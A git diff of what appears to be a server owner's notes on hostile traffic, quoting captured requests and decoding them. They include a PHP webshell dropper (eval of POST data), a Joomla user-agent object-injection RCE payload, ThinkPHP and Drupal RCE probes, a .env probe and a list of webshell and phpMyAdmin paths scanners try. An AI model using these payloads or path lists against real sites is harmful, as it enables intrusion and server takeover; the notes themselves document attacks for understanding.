@@ -74,5 +74,166 @@ done
 -----------------------------------------------------------------------------------
 
 Again, you're free to nmap those uncensored ips like I have. There's unsecured and
-unupdated services running on those boxes too!
+unupdated services running on those boxes too! It looks like this script is trying
+to mine some sort of crypto on my machine and donate it to another crypto wallet located
+elsewhere...
 
+
+Another couple of weird bf requests from: 192.99.0.107
+(reewith.me) also points to this server.
+URL: https://www.reewith.me/?1=%40ini_set%28%22display_errors%22%2C%220%22%29%3B%40set_time_limit%280%29%3B%40set_magic_quotes_runtime%280%29%3Becho%20%27-%3E%7C%27%3Bfile_put_contents%28%24_SERVER%5B%27DOCUMENT_ROOT%27%5D.%27/webconfig.txt.php%27%2Cbase64_decode%28%27PD9waHAgZXZhbCgkX1BPU1RbMV0pOz8%2B%27%29%29%3Becho%20%27%7C%3C-%27%3B
+{ 'accept-encoding': 'identity',
+  host: 'www.reewith.me',
+  connection: 'close',
+  'user-agent':
+   '}__test|O:21:"JDatabaseDriverMysqli":3:{s:2:"fc";O:17:"JSimplepieFactory":0:{}s:21:"\\0\\0\\0disconnectHandlers";a:1:{i:0;a:2:{i:0;O:9:"SimplePie":5:{s:8:"sanitize";O:20:"JDatabaseDriverMysql":0:{}s:8:"feed_url";s:46:"eval($_REQUEST[1]);JFactory::getConfig();exit;";s:19:"cache_name_function";s:6:"assert";s:5:"cache";b:1;s:11:"cache_class";O:20:"JDatabaseDriverMysql":0:{}}i:1;s:4:"init";}}s:13:"\\0\\0\\0connection";b:1;}ð' }
+
+the url decoded:
+1=@ini_set("display_errors","0");@set_time_limit(0);@set_magic_quotes_runtime(0);echo '->|';file_put_contents($_SERVER['DOCUMENT_ROOT'].'/webconfig.txt.php',base64_decode('PD9waHAgZXZhbCgkX1BPU1RbMV0pOz8+'));echo '|<-';
+and finally the base64 decoded:
+<?php eval($_POST[1]);?>
+
+nothing that interesting besides the user agent which actually doesn't look like a user
+agent but just an appended body of data to the request?? Some java database driver stuff.
+
+URL: https://www.reewith.me//webconfig.txt.php
+{ host: 'www.reewith.me',
+  connection: 'keep-alive',
+  'accept-encoding': 'gzip, deflate',
+  accept: '*/*',
+  'user-agent':
+   'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.90 Safari/537.36',
+  'x-forwarded-for': '17.83.116.180',
+  referer: 'http://www.google.com.hk' }
+
+Funny that the site is is indexed by google already and that the bot was refered from google
+hong kong. Also we know that the original client ip from x-forwarded-for header.
+
+another interesting request:
+--INSECURE REQUEST:
+URL: https://54.204.62.167/w00tw00t.at.blackhats.romanian.anti-sec:)
+{ accept: '*/*',
+  'accept-language': 'en-us',
+  'accept-encoding': 'gzip, deflate',
+  'user-agent': 'ZmEu',
+  host: '54.204.62.167',
+  connection: 'Close' }
+::ffff:118.24.160.41
+undefined
+undefined
+--END INSECURE REQUEST
+
+this is probably an attempt to fingerprint the server somehow.
+yep: https://blog.arnonerba.com/2016/06/server-logs-explained-part-2
+'banner grabbing'
+this ip also had a large amount of other file enumeration requests for php files:
+I guess I could make my own enumeration wordlist by scanning my logs.
+paths accessed:
+/scripts/setup.php,
+/admin/scripts/setup.php,
+/admin/pma/scripts/setup.php,
+/admin/phpmyadmin/scripts/setup.php,
+/db/scripts/setup.php,
+/dbadmin/scripts/setup.php,
+/myadmin/scripts/setup.php,
+/mysql/scripts/setup.php,
+/mysqladmin/scripts/setup.php,
+/typo3/phpmyadmin/scripts/setup.php,
+/phpadmin/scripts/setup.php,
+/pma/scripts/setup.php,
+/web/phpMyAdmin/scripts/setup.php,
+/xampp/phpmyadmin/scripts/setup.php,
+/web/scripts/setup.php,
+/php-my-admin/scripts/setup.php,
+/websql/scripts/setup.php,
+/phpMyAdmin-2/scripts/setup.php,
+_phpmyadmin/scripts/setup.php,
+/administrator/components/com_joommyadmin/phpmyadmin/scripts/setup.php,
+/phpmyadmin/scripts/setup.php
+/apache-default/phpmyadmin/scripts/setup.php,
+/blog/phpmyadmin/scripts/setup.php,
+/cpanelphpmyadmin/scripts/setup.php,
+/cpphpmyadmin/scripts/setup.php,
+/forum/phpmyadmin/scripts/setup.php,
+/php/phpmyadmin/scripts/setup.php,
+/phpMyAdmin-2.11.1-all-languages/scripts/setup.php,
+/phpMyAdmin-2.6.1-pl2/scripts/setup.php,
+/phpMyAdmin-2.6.4-pl4/scripts/setup.php,
+/phpMyAdmin-2.6.4-rc1/scripts/setup.php,
+/Appa73ecc36.php
+/webdav
+/help.php
+/java.php
+/hell.php
+/pmd_online.php
+/shell.php <-lmao might be checking for someone else already having rce
+/cmd.php
+/uploader.php
+/lol.php
+/cmdd.php
+/desktop.ini.php
+
+a bunch of files enumerated from 132.232.82.19
+
+
+etc...
+
+Some requests from a user agent:
+CheckMarkNetwork/1.0 (+http://www.checkmarknetwork.com/spider.html)'
+Interesting brand monitoring service.
+
+
+Another interesting url:
+/index.php?s=%2f%69%6e%64%65%78%2f%5c%74%68%69%6e%6b%5c%61%70%70%2f%69%6e%76%6f%6b%65%66%75%6e%63%74%69%6f%6e&function=%63%61%6c%6c%5f%75%73%65%72%5f%66%75%6e%63%5f%61%72%72%61%79&vars[0]=%6d%645&vars[1][]=%48%65%6c%6c%6f%54%68%69%6e%6b%50%
+
+decoded:
+/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPc
+
+lol:
+images/vuln.php
+/huoshan.php
+/whoami.php.php
+
+sooo many php files iterated...
+zshmindex.php
+zuoindex.php
+toor.php
+/wp-content/plugins/portable-phpmyadmin/wp-pma-mod/index.php
+
+maybe i should start returning wildcard dynamic results so that at least the bots using
+stuff like dirbuster or wfuzz get deterred.
+
+https://54.204.62.167/%75%73%65%72/%72%65%67%69%73%74%65%72?%65%6c%65%6d%65%6e%74%5f%70%61%72%65%6e%74%73=%74%69%6d%65%7a%6f%6e%65%2f%74%69%6d%65%7a%6f%6e%65%2f%23%76%61%6c%75%65&%61%6a%61%78%5f%66%6f%72%6d=1&%5f%77%72%61%70%70%65%72%5f%66%6f%72%6d%61%74=%64%72%75%70%61%6c%5f%61%6http://54.204.62.167/
+
+decoded:
+https://54.204.62.167/user/register?element_parents=timezone/timezone/#value&ajax_form=1&_wrapper_format=drupal_a%6http://54.204.62.167/
+
+yey finally googlebot:
+URL: https://reewith.me/robots.txt
+{ host: 'reewith.me',
+  connection: 'keep-alive',
+  accept: 'text/plain,text/html,*/*',
+  'user-agent':
+   'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
+  'accept-encoding': 'gzip,deflate,br' }
+::ffff:66.249.69.38
+{}
+
+**SECURE REQUEST:
+URL: https://54.204.62.167/.env
+{ 'user-agent':
+   'curl/7.19.7 (x86_64-redhat-linux-gnu) libcurl/7.19.7 NSS/3.13.1.0 zlib/1.2.3 libidn/1.18 libssh2/1.2.2',
+  host: '54.204.62.167',
+  accept: '*/*' }
+::ffff:91.107.64.185
+{}
+{}
+** END SECURE REQUEST
+77.247.110.60
+
+why do library versions get returned in user agent?
+
+ooh masscan??
+"user-agent": "masscan/1.0 (https://github.com/robertdavidgraham/masscan)",
+funny enough, some of these ips are noted for their bruteforce attempts:
+http://bruteforcers.net/592446
